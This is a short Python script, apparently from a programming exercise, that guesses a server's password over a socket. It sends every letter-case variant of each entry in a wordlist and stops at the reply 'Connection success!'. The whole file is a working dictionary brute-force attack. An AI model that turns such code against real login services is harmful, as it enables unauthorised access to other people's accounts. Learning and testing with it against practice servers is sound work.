# from string import ascii_lowercase, digits
import socket
from sys import argv
import itertools

# password_letters = ascii_lowercase + digits
# password_length = len(password_letters)
hostname, port = argv[1:]
address = (hostname, int(port))
with socket.socket() as my_socket:
    my_socket.connect(address)
    with open('passwords.txt', 'r', encoding='utf-8') as f:
        for pw in f:
            for i in map(''.join, itertools.product(*(sorted({c.upper(), c.lower()}) for c in pw))):
                my_socket.send(i.encode())
                server_response = my_socket.recv(1024)
                if server_response == b'Connection success!':
                    print(i)
                    exit()
